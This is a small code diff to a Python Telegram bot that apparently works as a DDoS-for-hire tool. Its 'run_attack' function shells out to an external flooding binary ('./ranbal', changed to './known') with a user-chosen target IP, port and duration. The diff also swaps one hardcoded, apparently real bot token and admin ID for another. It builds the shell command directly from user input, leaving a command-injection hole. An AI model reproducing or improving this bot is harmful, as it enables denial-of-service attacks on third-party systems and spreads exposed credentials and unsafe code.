@@ -3,8 +3,8 @@ import datetime
 from telegram import Update
 from telegram.ext import Application, CommandHandler, CallbackContext
 
-TELEGRAM_BOT_TOKEN = '7627929224:AAH3SJb9rV6SiPocUivuRPBK1ycNM9AoXE4'
-ADMIN_USER_ID = 5759284972
+TELEGRAM_BOT_TOKEN = '8172135637:AAHJEWKNMWt1AcUq_pqCMmdtlYh5KADjPMk'
+ADMIN_USER_ID = 5142603617
 USERS_FILE = 'users.txt'
 LOG_FILE = 'log.txt'
 attack_in_progress = False
@@ -134,7 +134,7 @@ async def run_attack(chat_id, ip, port, duration, context):
     attack_in_progress = True
 
     try:
-        command = f"./ranbal {ip} {port} {duration} 800"
+        command = f"./known {ip} {port} {duration} {7} {900}"
         process = await asyncio.create_subprocess_shell(
             command,
             stdout=asyncio.subprocess.PIPE,
